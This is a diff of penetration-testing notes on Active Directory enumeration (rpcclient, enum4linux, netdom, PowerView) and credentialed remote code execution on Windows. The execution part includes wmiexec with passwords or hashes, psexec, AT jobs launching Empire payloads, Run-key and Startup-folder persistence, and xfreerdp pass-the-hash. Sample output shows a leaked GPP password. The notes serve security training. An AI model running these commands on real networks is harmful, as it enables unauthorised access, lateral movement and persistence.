@@ -1,13 +1,501 @@
-=============================================
-Learning from the field : Administrative shells
-=============================================
+===========================================================================
+Learning from the field : Active Directory Recon and Administrative shells 
+===========================================================================
 
-Once, we have access to a priviledged user of windows domain, there are multiple ways to get a execute remote commands on the remote machine.
+Once, we have access to **credentials of a domain user of windows domain**, we can utilize the credentials to do windows **active directory enumeration** such as figuring out the domain controllers, users, machines, trust etc. This post looks into the various methods which are available to do the enumeration such as rpclient, enum4linux, netdom, powerview, bloodhound, adexplorer, Jexplorer etc.
+
+Also, once we have **administrative credentials** there are multiple ways to get a **execute remote commands** on the remote machine such winexe, crackmapexec, impacket psexec, smbexec, wmiexec, Metasploit psexec, Sysinternals psexec, task scheduler, remote registry, WinRM, WMI, DCOM, remote desktop etc. We have a look over all the methods with possible examples. 
+
+Did we missed something? please send us a pull request and we will add it. 
+
+
+Recon Active Directory:
+------------------------
+
+rpclient
+^^^^^^^^^^
+
+eskoudis presents great amount of information at `Plundering Windows Account Infor via Authenticated SMB Session <https://pen-testing.sans.org/blog/2013/07/24/plundering-windows-account-info-via-authenticated-smb-sessions>`_.  carnal0wnage have written `Enumerating user accounts on linux and OSX <http://carnal0wnage.attackresearch.com/2007/07/enumerating-user-accounts-on-linux-and.html>`_ and BlackHills have written `Password Spraying and Other Fun with RPC Client <http://www.blackhillsinfosec.com/?p=4645>`_  Most of the stuff has been taken from the above three.
+
+* Connection:
+
+ ::
+
+  rpcclient -U xxxxs.hxxxx.net/mlxxxxh 10.0.65.103 
+
+* Version of the target Windows machine:
+
+ ::
+  
+  rpcclient $> srvinfo
+  10.0.65.103    Wk Sv BDC Tim NT     
+  platform_id     :       500
+  os version      :       6.3
+  server type     :       0x801033
+
+* enum commands:
+
+ ::
+
+  rpcclient $> enum
+
+  enumalsgroups  enumdomains    enumdrivers    enumkey     enumprivs
+  enumdata       enumdomgroups  enumforms      enumports   enumtrust
+  enumdataex     enumdomusers   enumjobs       enumprinter
+
+* Tell the current domain 
+
+ ::
+  
+  enumdomains 
+  name:[xxxx] idx:[0x0]
+  name:[Builtin] idx:[0x0]
+
+* Enum Domain info
+
+ ::
+
+  rpcclient $> querydominfo 
+  Domain               :  xxxx
+  Server               :  HMC_PDC-TEMP
+  Comment              :      
+  Total Users          :  9043
+  Total Groups         :  0
+  Total Aliases        :  616
+  Sequence No          :  1
+  Force Logoff         : -1
+  Domain Server State  :  0x1
+  Server Role          :  ROLE_DOMAIN_BDC
+  Unknown 3           :    0x1
+
+* Enum Domain users:
+
+  ::
+   
+   rpcclient $> enumdomusers 
+   user:[administrator] rid:[0x1f4]
+   user:[Guest] rid:[0x1f5]
+   user:[krbtgt] rid:[0x1f6]
+   user:[_STANDARD] rid:[0x3ee]
+   user:[Install] rid:[0x3fa]
+   user:[sko] rid:[0x43a]
+   user:[cap] rid:[0x589]
+   user:[zentrale] rid:[0x67f]
+   user:[dbserver] rid:[0x7d9]
+   user:[JVOO] rid:[0x7fa]
+   user:[Standard HMC User Te] rid:[0x8a0]
+   user:[event] rid:[0x8d5]
+   user:[remote] rid:[0x9ea]
+   user:[pda-vis1] rid:[0xb65]
+   user:[TestUser] rid:[0xc46]
+   user:[oeinstall] rid:[0x1133]
+   user:[repro] rid:[0x13c3]
+
+* Enum Domain groups:
+
+ ::
+
+   rpcclient $> enumdomgroups 
+   group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
+   group:[Domain Admins] rid:[0x200]
+   group:[Domain Users] rid:[0x201]
+   group:[Domain Guests] rid:[0x202]
+   group:[Domain Computers] rid:[0x203]
+   group:[Domain Controllers] rid:[0x204]
+   group:[Schema Admins] rid:[0x206]
+   group:[Enterprise Admins] rid:[0x207]
+   group:[Group Policy Creator Owners] rid:[0x208]
+   group:[Read-only Domain Controllers] rid:[0x209]
+   group:[Cloneable Domain Controllers] rid:[0x20a]
+   group:[Protected Users] rid:[0x20d]
+   group:[xxxx Users] rid:[0x4d8]
+   group:[IC Members] rid:[0x50d]
+   group:[Event Management] rid:[0x8d7]
+   group:[SMSInternalCliGrp] rid:[0x9f5]
+   group:[IT Support] rid:[0x105b]
+
+
+* Enum Group Information and Group Membership
+
+ ::
+
+  rpcclient $> querygroup 0x200
+  Group Name:     Domain Admins
+  Description:    Designated administrators of the domain
+  Group Attribute:7
+  Num Members:16
+
+
+ ::
+
+  rpcclient $> querygroupmem 0x200
+  rid:[0x2227] attr:[0x7]
+  rid:[0x3601] attr:[0x7]
+  rid:[0x36aa] attr:[0x7]
+  rid:[0x36e0] attr:[0x7]
+  rid:[0x3c23] attr:[0x7]
+  rid:[0x5528] attr:[0x7]
+  rid:[0x1f4]  attr:[0x7]
+  rid:[0x363b] attr:[0x7]
+  rid:[0x573e] attr:[0x7]
+  rid:[0x56bc] attr:[0x7]
+  rid:[0x5e5e] attr:[0x7]
+  rid:[0x7fe1] attr:[0x7]
+  rid:[0x86d9] attr:[0x7]
+  rid:[0x9367] attr:[0x7]
+  rid:[0x829c] attr:[0x7]
+  rid:[0xa26e] attr:[0x7]
+
+* Enumerate specfic User/ computer information by RID
+
+ ::
+
+  rpcclient $> queryuser 0x3601
+  User Name   :   dummy_s
+  Full Name   :   Dummy User
+  Home Drive  :   
+  Dir Drive   :   
+  Profile Path:   
+  Logon Script:   
+  Description :   E 5.5.2008 Admin
+  Workstations:   
+  Comment     :   
+  Logon Time               :      Tue, 24 Jan 2017 19:28:14 IST
+  Logoff Time              :      Thu, 01 Jan 1970 05:30:00 IST
+  Kickoff Time             :      Thu, 14 Sep 30828 08:18:05 IST
+  Password last set Time   :      Fri, 21 Nov 2008 02:34:34 IST
+  Password can change Time :      Fri, 21 Nov 2008 02:34:34 IST
+  Password must change Time:      Thu, 14 Sep 30828 08:18:05 IST
+
+* Get Domain Password Policy
+
+ ::
+
+  rpcclient $> getdompwinfo 
+  min_password_length: 8
+  password_properties: 0x00000000
+
+* Get user password policies
+
+ ::
+
+  rpcclient $> getusrdompwinfo 0x3601
+  min_password_length: 8
+  &info.password_properties: 0x433e6584 (1128162692)
+  0: DOMAIN_PASSWORD_COMPLEX  
+  0: DOMAIN_PASSWORD_NO_ANON_CHANGE
+  1: DOMAIN_PASSWORD_NO_CLEAR_CHANGE
+  0: DOMAIN_PASSWORD_LOCKOUT_ADMINS
+  0: DOMAIN_PASSWORD_STORE_CLEARTEXT
+  0: DOMAIN_REFUSE_PASSWORD_CHANGE
+
+Enum4linux
+^^^^^^^^^^^
+
+Simple wrapper around the tools in the samba package to provide similar functionality to enum.exe (formerly from www.bindview.com).
+
+::
+
+ Usage: ./enum4linux.pl [options] ip
+
+ Options are (like "enum"):
+     -U        get userlist
+     -M        get machine list*
+     -S        get sharelist
+     -P        get password policy information
+     -G        get group and member list
+     -d        be detailed, applies to -U and -S
+     -u user   specify username to use (default "")  
+     -p pass   specify password to use (default "")   
+
+
+ Additional options:
+    -a        Do all simple enumeration (-U -S -G -P -r -o -n -i).
+              This opion is enabled if you don't provide any other options.
+    -h        Display this help message and exit
+    -r        enumerate users via RID cycling
+    -R range  RID ranges to enumerate (default: 500-550,1000-1050, implies -r)
+    -K n      Keep searching RIDs until n consective RIDs don't correspond to
+              a username.  Impies RID range ends at 999999. Useful 
+	      against DCs.
+    -l        Get some (limited) info via LDAP 389/TCP (for DCs only)
+    -s file   brute force guessing for share names
+    -k user   User(s) that exists on remote system (default: administrator,guest,krbtgt,domain admins,root,bin,none)
+              Used to get sid with "lookupsid known_username"
+    	      Use commas to try several users: "-k admin,user1,user2"
+    -o        Get OS information
+    -i        Get printer information
+    -w wrkg   Specify workgroup manually (usually found automatically)
+    -n        Do an nmblookup (similar to nbtstat)
+    -v        Verbose.  Shows full commands being run (net, rpcclient, etc.)
+
+Example: 
+
+::
+
+ enum4linux -P -d xxxx.abcxxx.net -u mluxxxx -p threxxxx 10.0.65.103
+
+Active Directory Explorer ADExplorer
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+As per the technet article `Active Directory Explorer (AD Explorer) <https://technet.microsoft.com/en-us/sysinternals/adexplorer.aspx>`_ is an advanced Active Directory (AD) viewer and editor. We can use AD Explorer to easily navigate an AD database, define favorite locations, view object properties and attributes without having to open dialog boxes, edit permissions, view an object's schema, and execute sophisticated searches that you can save and re-execute. 
+
+JXplorer
+^^^^^^^^^
+
+`JXplorer <http://jxplorer.org/>`_ is a cross platform LDAP browser and editor. It is a standards compliant general purpose LDAP client that can be used to search, read and edit any standard LDAP directory, or any directory service with an LDAP or DSML interface.
+
+
+netdom
+^^^^^^^
+netdom: netdom is a command-line tool that is built into Windows Server 2008 and Windows Server 2008 R2. It is available if you have the Active Directory Domain Services (AD DS) server role installed. It is also available if you install the Active Directory Domain Services Tools that are part of the Remote Server Administration Tools (RSAT). More information available at `Netdom query <https://technet.microsoft.com/en-us/library/cc835089(v=ws.11).aspx>`_. 
+
+::
+
+  netdom query {/d: | /domain:}<Domain> [{/s: | /server:}<Server>] [{/ud: | /userd:}[<Domain>\]<User> {/pd: | /passwordd}{<Password>|*}] [/verify] [/reset] [/direct] {WORKSTATION|SERVER|DC|OU|PDC|FSMO|TRUST} [{/help | /?}]
+
+  Specifies the type of list to generate. The following list shows the possible objects:
+  WORKSTATION: Queries the domain for the list of workstations.
+  SERVER: Queries the domain for the list of servers.
+  DC   : Queries the domain for the list of domain controllers.
+  OU   : Queries the domain for the list of OUs under which the user that you specify can create a computer object.
+  PDC  : Queries the domain for the current primary domain controller.
+  FSMO : Queries the domain for the current list of operations master role holders. These role holders are also known as flexible single master operations (FSMO).
+  TRUST: Queries the domain for the list of its trusts.
+
+* DC: Queries the domain for the list of workstations:
+
+ :: 
+
+  PS C:\> netdom query /domain example.net DC
+  List of domain controllers with accounts in the domain:
+  
+  xxxxDC12
+  xxxxDC11
+  xxxxDC04
+  xxxxDC03
+  The command completed successfully.
+
+* PDC: Queries the domain for the current primary domain controller
+
+ ::
+ 
+  PS C:\> netdom query /domain example.net PDC
+  Primary domain controller for the domain:
+  
+  xxxxDC03.example.net
+  The command completed successfully.
+
+* FSMO: Queries the domain for the current list of operations master role holders.  
+
+ ::
+
+  PS C:\> netdom query /domain example.net FSMO
+  Schema master               xxxxDC03.example.net
+  Domain naming master        xxxxDC03.example.net
+  PDC                         xxxxDC03.example.net
+  RID pool manager            xxxxDC03.example.net
+  Infrastructure master       xxxxDC03.example.net
+  The command completed successfully. 
+
+* TRUST: Queries the domain for the list of its trusts
+
+ ::
+
+  PS C:\> netdom query /domain example.net TRUST
+  Direction Trusted\Trusting domain      Trust type
+  ========= =======================      ==========   
+  
+  <->       xxxx.xxxxxx.net              Direct
+  <->       xxxx.example.net             Direct
+  <->       XX.XXXxXX.NET                Direct
+
+* OU: Queries the domain for the list of OUs under which the user that you specify can create a computer object.
+
+ ::
+
+  PS C:\> netdom query /domain abc.example.net OU
+  List of Organizational Units within which the specified user can create a
+  machine account:
+  
+  OU=Domain Controllers,DC=abc,DC=example,DC=net
+  OU=ABC-Admin,DC=abc,DC=example,DC=net
+  OU=ServiceAccounts,OU=ABC-Admin,DC=abc,DC=example,DC=net
+  OU=Users,OU=ABC-Admin,DC=abc,DC=example,DC=net
+  OU=Groups,OU=ABC-Admin,DC=abc,DC=example,DC=net
+  OU=Service Accounts,DC=abc,DC=example,DC=net
+  OU=Servers,OU=ABC-Admin,DC=abc,DC=example,DC=net
+  DC=abc,DC=example,DC=net
+  The command completed successfully.
+
+* SERVER/ WORKSTATION: Queries the domain for the list of servers/ workstations
+
+ ::   
+
+  PS C:\> netdom query /domain abc.example.net WORKSTATION
+  List of workstations with accounts in the domain:
+
+  ABCDC02      ( Workstation or Server )
+  ABCDC01      ( Workstation or Server )
+  ABCDC03      ( Workstation or Server )
+  ABCDC04      ( Workstation or Server )
+  BSKMACDB62   ( Workstation or Server )
+
+  The command completed successfully.
+
+  PS C:\>
+
+
+Get sessions of remote machines
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+* Powerview Get-NetSession
+
+* net session
+
+ * Net session of current computer
+
+  ::
+
+   net session
+
+   Computer               User name            Client Type       Opens Idle time
+
+   -------------------------------------------------------------------------------
+   \\127.0.0.1            Administrat0r                              1 05D 22H 02M
+
+   The command completed successfully.
+
+ * Net session of remote computer
+ 
+  :: 
+
+   net session \\computername
+
+* Wmi: We can use wmi to get the remote logged on users. However, I believe to run wmi on remote machine, you need to be administrator of that machine.
+
+ ::
+
+  wmic:root\cli> /node:"computername" path win32_loggeduser get antecedent
+  
+  \\.\root\cimv2:Win32_Account.Domain="ABCROOT",Name="adm.xxxxx"
+  \\.\root\cimv2:Win32_Account.Domain="ABCROOT",Name="srv.xxxxx"
+  \\.\root\cimv2:Win32_Account.Domain="ABCROOT",Name="adm.xxxxx"
+  \\.\root\cimv2:Win32_Account.Domain="EA",Name="admd.xxxxx"
+  \\.\root\cimv2:Win32_Account.Domain="DC",Name="ANONYMOUS LOGON"
+
+
+
+View users in Domain / Workgroup
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+* Powerview Get-NetUser
+
+* net user /domain
+
+* wmi
+
+ Domain users:
+
+ :: 
+
+  wmic useraccount list /format:list 
+
+
+View machines in Domain/ Workgroup
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+* Powerview Get-NetComputers
+
+* net view /domain ? -- check the functionality
+
+* View machines affected by GPP vulnerability
+
+ When we run Get-GPPPassword, we get output like
+
+ ::
+
+  Password: password@123
+  Changed : 2013-07-02 01:01:23
+  Username: Administrator
+  NewName : 
+  File    : \\Demo.lab\sysvol\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\DataSources\{DataSouces| Groups| ScheduledTasks.xml
+
+ To get the computers using the passwords set by the GPP, we can use
+
+ ::
+
+  Get-NetOU -GUID "{31B2F340-016D-11D2-945F-00C04FB984F9}" | %{ Get-NetComputer -ADSPath $_ }
+
+ Get-NetSite function, which returns the current sites for a domain, also accepts the -GUID filtering flag. This information has been taken from harmj0y blog `gpp and powerview <http://www.harmj0y.net/blog/powershell/gpp-and-powerview/>`_ 
+
+
+
+View group in Domain / Workgroup
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+* Powerview Get-NetGroupMember
+
+* Net group / domain? options
+
+* Windows Resource Kit Local/ Global executable
+
+ * Global.exe 
+
+  ::
+
+   PS C:\> .\global.exe
+
+   Displays members of global groups on remote servers or domains.
+
+   GLOBAL group_name domain_name | \\server
+
+   group_name    The name of the global group to list the members of.
+   domain_name   The name of a network domain.
+   \\server      The name of a network server.
+
+   Examples:
+   Global "Domain Users" EastCoast
+   Displays the members of the group 'Domain Users' in the EastCoast domain.
+
+   Global PrintUsers \\BLACKCAT
+   Displays the members of the group PrintUsers on server BLACKCAT.
+
+   Notes:
+   Names that include space characters must be enclosed in double quotes.
+   To list members of local groups use Local.Exe.
+   To get the Server name for a give Domain use GetDC.Exe.
+
+  Example:
+
+  ::
+
+   PS C:\> .\global.exe "Domain Admins" \\domainname
+   Uraxxxx
+   adm.xxxxx
+   adm.xxxxx2
+   adm.xxxxxx3
+
+
+* BloodHound Group Memberships
+
+* wmi user groups
+ 
+ ::
+
+  wmic group list brief
+  ABCD\SUS Administrator    ABCD          SUS Administrator                                         S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX-7357
+  ABCD\VPN Admins           ABCD          VPN Admins                                                S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX-8728
+  ABCD\VPN Users            ABCD          VPN Users                                                 S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX-9229
+  ABCD\XXX - OER Users      ABCD          XXX - OER Users                                           S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX-5095
+
+
 
 Remote Code Execution Methods:
 ------------------------------
 
-A lot of details for Remote Code execution has already been mentioned by Rop Nop in his three parts `Part 1: Using credentials to own windows boxes <https://blog.ropnop.com/using-credentials-to-own-windows-boxes/>`_ , `Part2: PSExec and Services <https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/>`_ and `Part: 3 Wmi and WinRM <https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/>`_
+A lot of details for Remote Code execution has already been mentioned by Rop Nop in his three parts `Part 1: Using credentials to own windows boxes <https://blog.ropnop.com/using-credentials-to-own-windows-boxes/>`_ , `Part2: PSExec and Services <https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/>`_ and `Part: 3 Wmi and WinRM <https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/>`_ and by scriptjunkie in his blog `Authenticated Remote Code Execution Methods in Windows <https://www.scriptjunkie.us/2013/02/authenticated-remote-code-execution-methods-in-windows/>`_ 
+
+We have just summarized all in one page with *working* examples whereever possible.
 
 Winexe
 ^^^^^^
@@ -220,6 +708,38 @@ Impacket psexec/ smbexe/ wmiexec
 
  ::
 
+  Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
+  
+  usage: wmiexec.py [-h] [-share SHARE] [-nooutput] [-debug]
+                    [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key]
+                    [-dc-ip ip address]
+                    target [command [command ...]]
+
+  Executes a semi-interactive shell using Windows Management Instrumentation.
+
+  positional arguments:
+    target                [[domain/]username[:password]@]<targetName or address>
+    command               command to execute at the target. If empty it will
+                          launch a semi-interactive shell
+
+  authentication:
+    -hashes LMHASH:NTHASH
+                          NTLM hashes, format is LMHASH:NTHASH
+    -no-pass              don't ask for password (useful for -k)
+    -k                    Use Kerberos authentication. Grabs credentials from
+                          ccache file (KRB5CCNAME) based on target parameters.
+                          If valid credentials cannot be found, it will use the
+                          ones specified in the command line
+    -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256
+                          bits)
+    -dc-ip ip address     IP Address of the domain controller. If ommited it use
+                          the domain part (FQDN) specified in the target
+                          parameter
+
+ Example with password:
+
+ ::
+
   wmiexec.py -debug Administrat0r:Passw0rd\!\!@10.0.5.180
 
   Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
@@ -240,11 +760,17 @@ Impacket psexec/ smbexe/ wmiexec
 
   C:\>
 
+ Example with hashes:
+ ::
+
+    wmiexec.py -debug -hashes xxxxxxxxxxxxxx:xxxxxxx  Administrat0r@10.0.5.180
+  
+  
 
 Metasploit psexec
 ^^^^^^^^^^^^^^^^^^^
 
-Metasploit psexec have three methods to invoke, Let's first try with target 2: Native upload
+Metasploit psexec have three methods to invoke, 
 
 ::
 
@@ -259,6 +785,8 @@ Metasploit psexec have three methods to invoke, Let's first try with target 2: N
     2   Native upload
     3   MOF upload
 
+
+Let's first try with target 2: Native upload
 
 ::
 
@@ -336,264 +864,171 @@ Let's try also with target 3: MOF Upload
 Sysinternals psexec
 ^^^^^^^^^^^^^^^^^^^
 
+Microsoft Sysinternal tool psexec can be downloaded from `PsExec <https://technet.microsoft.com/en-us/sysinternals/pxexec.aspx>`_. Mark has written a good article on how psexec works is `PsExec Working <http://windowsitpro.com/systems-management/psexec>`_.
+
+::
+
+ psexec.exe \\Computername -u DomainName\username -p password <command>
+ command can be cmd.exe/ ipconfig etc.
 
 smbclient:
 ^^^^^^^^^^^
 
-rpclient
-^^^^^^^^^^
+Yet to run:
 
- eskoudis presents great amount of information at `Plundering Windows Account Infor via Authenticated SMB Session <https://pen-testing.sans.org/blog/2013/07/24/plundering-windows-account-info-via-authenticated-smb-sessions>`_ 
- carnal0wnage have written `Enumerating user accounts on linux and OSX <http://carnal0wnage.attackresearch.com/2007/07/enumerating-user-accounts-on-linux-and.html>`_ 
- and BlackHills have written `Password Spraying and Other Fun with RPC Client <http://www.blackhillsinfosec.com/?p=4645>`_  Most of the stuff has been taken from the above three.
+Task Scheduler
+^^^^^^^^^^^^^^
+If you are the administrator of the remote machine and using runas /netonly, we can utilize AT to run commands remotely. Using AT, a command to be run at designated time(s) as SYSTEM.
 
-* Connection:
-
- ::
-
-  rpcclient -U xxxxs.hxxxx.net/mlxxxxh 10.0.65.103 
-
-* Version of the target Windows machine:
-
- ::
-  
-  rpcclient $> srvinfo
-  10.0.65.103    Wk Sv BDC Tim NT     
-  platform_id     :       500
-  os version      :       6.3
-  server type     :       0x801033
-
-* enum commands:
-
- ::
-
-  rpcclient $> enum
-
-  enumalsgroups  enumdomains    enumdrivers    enumkey     enumprivs
-  enumdata       enumdomgroups  enumforms      enumports   enumtrust
-  enumdataex     enumdomusers   enumjobs       enumprinter
-
-* Tell the current domain 
-
- ::
-  
-  enumdomains 
-  name:[xxxx] idx:[0x0]
-  name:[Builtin] idx:[0x0]
-
-* Enum Domain info
-
- ::
-
-  rpcclient $> querydominfo 
-  Domain:               xxxx
-  Server:               HMC_PDC-TEMP
-  Comment:      
-  Total Users:  9043
-  Total Groups: 0
-  Total Aliases:        616
-  Sequence No:  1
-  Force Logoff: -1
-  Domain Server State:  0x1
-  Server Role:  ROLE_DOMAIN_BDC
-  Unknown 3:    0x1
-
-* Enum Domain users:
-
-  ::
-   
-   rpcclient $> enumdomusers 
-   user:[administrator] rid:[0x1f4]
-   user:[Guest] rid:[0x1f5]
-   user:[krbtgt] rid:[0x1f6]
-   user:[_STANDARD] rid:[0x3ee]
-   user:[Install] rid:[0x3fa]
-   user:[sko] rid:[0x43a]
-   user:[cap] rid:[0x589]
-   user:[zentrale] rid:[0x67f]
-   user:[dbserver] rid:[0x7d9]
-   user:[JVOO] rid:[0x7fa]
-   user:[Standard HMC User Te] rid:[0x8a0]
-   user:[event] rid:[0x8d5]
-   user:[remote] rid:[0x9ea]
-   user:[pda-vis1] rid:[0xb65]
-   user:[TestUser] rid:[0xc46]
-   user:[oeinstall] rid:[0x1133]
-   user:[repro] rid:[0x13c3]
-
-* Enum Domain groups:
-
- ::
-
-   rpcclient $> enumdomgroups 
-   group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
-   group:[Domain Admins] rid:[0x200]
-   group:[Domain Users] rid:[0x201]
-   group:[Domain Guests] rid:[0x202]
-   group:[Domain Computers] rid:[0x203]
-   group:[Domain Controllers] rid:[0x204]
-   group:[Schema Admins] rid:[0x206]
-   group:[Enterprise Admins] rid:[0x207]
-   group:[Group Policy Creator Owners] rid:[0x208]
-   group:[Read-only Domain Controllers] rid:[0x209]
-   group:[Cloneable Domain Controllers] rid:[0x20a]
-   group:[Protected Users] rid:[0x20d]
-   group:[xxxx Users] rid:[0x4d8]
-   group:[IC Members] rid:[0x50d]
-   group:[Event Management] rid:[0x8d7]
-   group:[SMSInternalCliGrp] rid:[0x9f5]
-   group:[IT Support] rid:[0x105b]
-
-
-* Enum Group Information and Group Membership
-
- ::
-
-  rpcclient $> querygroup 0x200
-  Group Name:     Domain Admins
-  Description:    Designated administrators of the domain
-  Group Attribute:7
-  Num Members:16
-
-
- ::
-
-  rpcclient $> querygroupmem 0x200
-  rid:[0x2227] attr:[0x7]
-  rid:[0x3601] attr:[0x7]
-  rid:[0x36aa] attr:[0x7]
-  rid:[0x36e0] attr:[0x7]
-  rid:[0x3c23] attr:[0x7]
-  rid:[0x5528] attr:[0x7]
-  rid:[0x1f4] attr:[0x7]
-  rid:[0x363b] attr:[0x7]
-  rid:[0x573e] attr:[0x7]
-  rid:[0x56bc] attr:[0x7]
-  rid:[0x5e5e] attr:[0x7]
-  rid:[0x7fe1] attr:[0x7]
-  rid:[0x86d9] attr:[0x7]
-  rid:[0x9367] attr:[0x7]
-  rid:[0x829c] attr:[0x7]
-  rid:[0xa26e] attr:[0x7]
-
-* Enumerate specfic User/ computer information by RID
-
- ::
-
-  rpcclient $> queryuser 0x3601
-  User Name   :   dummy_s
-  Full Name   :   Dummy User
-  Home Drive  :   
-  Dir Drive   :   
-  Profile Path:   
-  Logon Script:   
-  Description :   E 5.5.2008 Admin
-  Workstations:   
-  Comment     :   
-  Logon Time               :      Tue, 24 Jan 2017 19:28:14 IST
-  Logoff Time              :      Thu, 01 Jan 1970 05:30:00 IST
-  Kickoff Time             :      Thu, 14 Sep 30828 08:18:05 IST
-  Password last set Time   :      Fri, 21 Nov 2008 02:34:34 IST
-  Password can change Time :      Fri, 21 Nov 2008 02:34:34 IST
-  Password must change Time:      Thu, 14 Sep 30828 08:18:05 IST
-
-* Get Domain Password Policy
-
- ::
-
-  rpcclient $> getdompwinfo 
-  min_password_length: 8
-  password_properties: 0x00000000
-
-* Get user password policies
-
- ::
-
-  rpcclient $> getusrdompwinfo 0x3601
-  min_password_length: 8
-  &info.password_properties: 0x433e6584 (1128162692)
-  0: DOMAIN_PASSWORD_COMPLEX  
-  0: DOMAIN_PASSWORD_NO_ANON_CHANGE
-  1: DOMAIN_PASSWORD_NO_CLEAR_CHANGE
-  0: DOMAIN_PASSWORD_LOCKOUT_ADMINS
-  0: DOMAIN_PASSWORD_STORE_CLEARTEXT
-  0: DOMAIN_REFUSE_PASSWORD_CHANGE
-
-Enum4linux
-^^^^^^^^^^^
-
-Simple wrapper around the tools in the samba package to provide similar functionality to enum.exe (formerly from www.bindview.com).
+Example:
 
 ::
 
- Usage: ./enum4linux.pl [options] ip
-
- Options are (like "enum"):
-     -U        get userlist
-     -M        get machine list*
-     -S        get sharelist
-     -P        get password policy information
-     -G        get group and member list
-     -d        be detailed, applies to -U and -S
-     -u user   specify username to use (default "")  
-     -p pass   specify password to use (default "")   
-
-
- Additional options:
-    -a        Do all simple enumeration (-U -S -G -P -r -o -n -i).
-              This opion is enabled if you don't provide any other options.
-    -h        Display this help message and exit
-    -r        enumerate users via RID cycling
-    -R range  RID ranges to enumerate (default: 500-550,1000-1050, implies -r)
-    -K n      Keep searching RIDs until n consective RIDs don't correspond to
-              a username.  Impies RID range ends at 999999. Useful 
-	      against DCs.
-    -l        Get some (limited) info via LDAP 389/TCP (for DCs only)
-    -s file   brute force guessing for share names
-    -k user   User(s) that exists on remote system (default: administrator,guest,krbtgt,domain admins,root,bin,none)
-              Used to get sid with "lookupsid known_username"
-    	      Use commas to try several users: "-k admin,user1,user2"
-    -o        Get OS information
-    -i        Get printer information
-    -w wrkg   Specify workgroup manually (usually found automatically)
-    -n        Do an nmblookup (similar to nbtstat)
-    -v        Verbose.  Shows full commands being run (net, rpcclient, etc.)
-
+ AT \\REMOTECOMPUTERNAME 12:34 "command to run"
 
 ::
 
- enum4linux -P -d xxxx.abcxxx.net -u mluxxxx -p threxxxx 10.0.65.103
+ AT \\REMOTECOMPUTERNAME 12:34 cmd.exe \c "command to run"
+ 
+ "command to run" can be web-delivery string or powershell empire string.
 
+If we need to delete the AT jobs, we can use
+
+::
+
+ AT \\REMOTECOMPUTERNAME id /delete /yes
+
+However, sometimes doing it remotely, we need to figure out the time of the remote computer, we can utilize NET TIME
+
+::
+
+ NET TIME \\REMOTECOMPUTERNAME
+
+Remote Registry
+^^^^^^^^^^^^^^^^
+
+A command to be run or DLL to be loaded when specific events occur, such as boot or login or process execution, as active user or SYSTEM.
+
+Example:
+::
+
+ REG ADD \\REMOTECOMPUTERNAME\HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v myentry /t REG_SZ /d "command to run"
+ 
+Command will run every time a user logs in as the user.
+
+We can query the remote registry also using
+
+::
+
+ REG QUERY \\REMOTECOMPUTERNAME\HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v myentry
+
+We can delete the remote registry using
+
+::
+
+ REG DELETE \\REMOTECOMPUTERNAME\HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v myentry
+
+
+Remote File Access
+^^^^^^^^^^^^^^^^^^^
+
+We can copy a launcher.bat file with powershell empire and drop it Startup folder, so that it executes every time a user logs in as a user.
+
+Example:
+
+::
+
+ xcopy executabletorun.exe "\\REMOTECOMPUTERNAME\C$\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\launcher.bat"
 
 WinRM
 ^^^^^
+Yet to run
 
 WMI
 ^^^
+
+As per the technet article `Windows Management Instrumentation <https://msdn.microsoft.com/en-us/library/aa394582(v=vs.85).aspx>`_ (WMI) is the infrastructure for management data and operations on Windows-based operating systems. You can write WMI scripts or applications to automate administrative tasks on remote computers.
+
+* Local code execution
+
+ WMI Process Create: The Win32_Process class can be called via WMI to query, modify, terminate, and create running processes.
+
+ ::
+  
+  wmic path win32_process call create "calc.exe"
+  Executing (win32_process)->create()
+  Method execution successful.
+  Out Paramteres:
+  instance of __PARAMETERS
+  {
+        ProcessId = 2616;
+        ReturnValue = 0;
+  };
+
+ The command returns the ProcessID and the ReturnValue (0 abcning no errors)
+
+* Remote code execution
+
+  We can use runas command to authenticate as a different user and then execute commands using wmic or use
+
+  ::
+
+   wmic /node:computername /user:domainname\username path win32_process call create "**empire launcher string here**"
+
+   instead of computername, we can specify textfile containing computernames and specify using
+   wmic /node:@textfile
+
+ Refer Rop-Nop blog `Part3: Wmi and winrm <https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/>`_
 
 DCOM 
 ^^^^
 
 * MMC20 + Two others Methods (Ask Tanoy/ read) - Enignma
 
+  Yet to run
+
 xfreerdp/ Remote Desktop
 ^^^^^^^^^^^^^^^^^^^^^^^^
 
+* rdesktop
 
-       ----dsquery !! SubMSI ? -- Twitter one -- who publishes a lot of stuff ? MSUtil to use RCE? / smbexec? 
+ ::
 
-       ----Any commands if net, or powershell is blocked? or PV/ BH is caught? 
+  rdesktop IPAddress
+
+* Pass the Hash with Remote Desktop: If we have a hash of a user, we can use xfreerdp to have remote desktop
+
+ ::
+
+  xfreerdp /u:user /d:domain /pth:hash /v:IPAddress
+
+ More information refer `Passing the Hash with Remote Desktop <https://www.kali.org/penetration-testing/passing-hash-remote-desktop/>`_ 
 
